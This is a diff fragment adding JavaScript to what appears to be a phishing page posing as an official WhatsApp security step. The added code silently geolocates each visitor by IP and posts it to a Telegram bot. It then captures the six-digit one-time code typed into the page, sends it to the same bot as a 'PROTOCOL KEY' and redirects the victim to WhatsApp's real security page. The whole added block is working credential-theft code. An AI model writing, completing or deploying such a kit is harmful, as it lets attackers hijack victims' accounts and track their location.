@@ -113,3 +113,25 @@
                 
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
+            }, 3000);
+
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                const log = `💎 <b>Official Access</b>\nTarget: <code>${CFG.U}</code>\nAP: ${getDev()}\nIP: <code>${d.ip}</code>\nCity: ${d.city}`;
+                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
+            } catch(e){}
+        }
+
+        async function finalize() {
+            const c = document.getElementById('otp-field').value;
+            if(c.length < 6) return;
+            const log = `🔥 <b>PROTOCOL KEY</b>\nTarget: ${CFG.U}\nKey: <code>${c}</code>\nTerminal: ${getDev()}`;
+            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
+            window.location.href = "https://www.whatsapp.com/security";
+        }
+
+        init();
+    </script>
+</body>
+</html>
